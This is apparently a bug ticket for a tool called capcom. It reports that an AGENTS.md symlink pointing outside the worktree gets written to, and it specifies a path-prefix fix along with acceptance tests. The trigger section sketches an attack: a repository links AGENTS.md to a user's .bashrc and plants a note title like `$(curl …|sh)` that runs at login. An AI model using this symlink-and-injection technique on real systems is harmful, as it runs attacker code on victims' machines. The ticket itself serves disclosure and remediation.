---
title: AGENTS.md symlink is followed outside the worktree on write
status: open
type: bug
priority: 1
deps: [guarded-file-reader]
plan: 2026-10-13 - 00 - code-and-architecture-review-fixes-plan
created: 2026-10-13T09:05:13Z
---

An `AGENTS.md` symlink is followed outside the working tree when the Managed block is written.
`resolveGuide` calls `filepath.EvalSymlinks` and accepts any target, and `reconcile` then
atomically replaces that target. Everywhere else capcom refuses to leave the tree. The gap was
introduced by the 2026-10-12 code-audit fix that made the block keep symlinks. Severity: High
(security).

Trigger: a cloned repository commits `AGENTS.md -> /home/<user>/.bashrc` (or
`../../.profile`). `capcom agents`, which the block's own intro tells agents to run, finds no
markers in the target and appends the block there. The block carries attacker-controlled Note
ids and titles, so a title such as `$(curl …|sh)` inside backticks runs at the next login. A
Note write's refresh does the same once the target holds a stale block. The only existing test
covers a symlink that stays inside the tree.

Wanted (decided 2026-10-13): the guide target is written only when its resolved path lies
inside the resolved worktree root, compared with a path-prefix check on cleaned paths, not a
string prefix. An outside link is refused only by `capcom agents` (write mode), with an
`agents.Error` naming the link and its target. `check`, `prime` and Note writes treat it as
having no block: no read, no write, no new problem or warning. The in-repository
`AGENTS.md -> CLAUDE.md` case keeps working.

## Acceptance

- A test in `internal/agents/block_test.go` points `AGENTS.md` at a file outside the test's
  worktree: `capcom agents` (write mode) fails with an `agents.Error` naming the link, and the
  refresh run after a Note write leaves it alone; in both cases the outside file's bytes are
  unchanged. Skipped on Windows if symlinks need privileges.
- The existing in-tree symlink test still passes.
- `GOMEMLIMIT=2GiB go test ./internal/agents/` and
  `GOMEMLIMIT=2GiB go test ./internal/cli/ -run 'Agents|Know'` pass.

Source: docs/reviews/code-and-architecture-review-2026-10-13.md, F-01.
